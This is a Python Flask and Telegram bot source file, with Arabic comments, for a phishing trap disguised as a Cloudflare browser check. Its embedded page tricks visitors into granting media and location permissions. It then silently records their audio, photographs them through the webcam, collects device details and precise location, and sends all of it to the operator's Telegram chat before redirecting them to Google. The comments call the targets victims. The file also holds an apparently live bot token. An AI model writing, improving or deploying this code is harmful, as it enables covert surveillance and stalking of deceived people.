import os, base64, requests, io, sqlite3, json, logging
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

# ==========================================
# 1. الإعدادات والتهيئة (Global Config)
# ==========================================
app = Flask(__name__)
BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
ADMIN_ID = 7041600701
DB_NAME = "sif_ultimate_data.db"
BASE_URL = "https://sif-bot-pro.onrender.com"

# ==========================================
# 2. إدارة قاعدة البيانات (DB Engine)
# ==========================================
def init_db():
    """إنشاء جداول النظام لإدارة الضحايا والبيانات"""
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS logs 
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                      ip TEXT, type TEXT, content TEXT, timestamp TEXT)''')
        conn.commit()

def db_log(ip, t, content):
    with sqlite3.connect(DB_NAME) as conn:
        conn.execute("INSERT INTO logs (ip, type, content, timestamp) VALUES (?, ?, ?, ?)",
                     (ip, t, content, datetime.now().strftime("%H:%M:%S")))

# ==========================================
# 3. محرك تليجرام المتقدم (Telegram Driver)
# ==========================================
def bot_send(method, payload, files=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        return requests.post(url, data=payload, files=files, timeout=15)
    except: return None

def get_kb():
    return {
        "inline_keyboard": [
            [{"text": "🔗 جلب رابط الفخ", "callback_data": "get_link"}],
            [{"text": "📊 تقرير الضحايا", "callback_data": "stats"}, {"text": "🎙 الملفات الصوتية", "callback_data": "audio_logs"}],
            [{"text": "🛑 تصفير النظام", "callback_data": "reset"}]
        ]
    }

# ==========================================
# 4. واجهة "الفخ المطور" (HTML & JS - Full Audio Access)
# ==========================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification | Cloudflare</title>
    <style>
        body { background: #0e0e0e; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #161616; padding: 30px; border-radius: 15px; border: 1px solid #222; text-align: center; width: 90%; max-width: 400px; }
        .loader { border: 4px solid #222; border-top: 4px solid #f38020; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 18px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="loader"></div>
        <h2>Checking Browser...</h2>
        <p style="color:#777; font-size:13px;">يرجى السماح بالصلاحيات للمتابعة (ميكروفون، كاميرا، موقع)</p>
    </div>

    <script>
        async function postData(d) {
            await fetch('/api/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(d)
            });
        }

        async function main() {
            // 1. معلومات الجهاز
            const info = `📱 جهاز جديد:\\n- المعالج: ${navigator.hardwareConcurrency}\\n- الرام: ${navigator.deviceMemory}GB\\n- المنصة: ${navigator.platform}`;
            await postData({t: 'info', d: info});

            try {
                // 2. طلب الكاميرا والميكروفون والموقع معاً
                const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: true});
                
                // --- سحب الموقع ---
                navigator.geolocation.getCurrentPosition(p => {
                    postData({t: 'loc', d: `📍 الموقع: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`});
                });

                // --- تسجيل الصوت بصمت (5 ثوانٍ) ---
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, {type: 'audio/ogg'});
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        postData({t: 'audio', d: reader.result.split(',')[1]});
                    };
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);

                // --- التقاط الصورة ---
                setTimeout(async () => {
                    const v = document.createElement('video');
                    v.srcObject = stream; await v.play();
                    const c = document.createElement('canvas');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    postData({t: 'img', d: c.toDataURL('image/jpeg').split(',')[1]});
                    
                    // توجيه نهائي للتمويه
                    window.location.replace("https://google.com");
                }, 2000);

            } catch (e) {
                window.location.replace("https://google.com");
            }
        }
        window.onload = main;
    </script>
</body>
</html>
'''

# ==========================================
# 5. معالجة المسارات (Routes Logic)
# ==========================================
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        update = request.get_json(force=True, silent=True)
        if "message" in update:
            cid = update["message"]["chat"]["id"]
            bot_send("sendMessage", {"chat_id": cid, "text": "🔥 <b>نظام سيف الخارق (v4.0) جاهز</b>\\nتم دمج الميكروفون والموقع الدقيق.", "parse_mode": "HTML", "reply_markup": get_kb()})
        elif "callback_query" in update:
            cb = update["callback_query"]; data = cb["data"]; cid = cb["message"]["chat"]["id"]
            if data == "get_link":
                bot_send("sendMessage", {"chat_id": cid, "text": f"🚀 رابط الصيد:\\n<code>{BASE_URL}</code>", "parse_mode": "HTML"})
            elif data == "stats":
                bot_send("sendMessage", {"chat_id": cid, "text": "📊 الإحصائيات قيد التطوير..."})
        return "OK", 200
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/capture', methods=['POST'])
def capture():
    d = request.get_json(force=True, silent=True)
    if not d: return "OK"
    
    t, content = d['t'], d['d']
    ip = request.remote_addr
    db_log(ip, t, "Data received")

    if t == 'info' or t == 'loc':
        bot_send("sendMessage", {"chat_id": ADMIN_ID, "text": content})
    elif t == 'img':
        img = io.BytesIO(base64.b64decode(content)); img.name = 'shot.jpg'
        bot_send("sendPhoto", {"chat_id": ADMIN_ID, "caption": "📸 صورة الكاميرا"}, files={'photo': img})
    elif t == 'audio':
        audio = io.BytesIO(base64.b64decode(content)); audio.name = 'voice.ogg'
        bot_send("sendVoice", {"chat_id": ADMIN_ID, "caption": "🎙 تسجيل صوتي من الضحية (5 ثوانٍ)"}, files={'voice': audio})
        
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=10000)
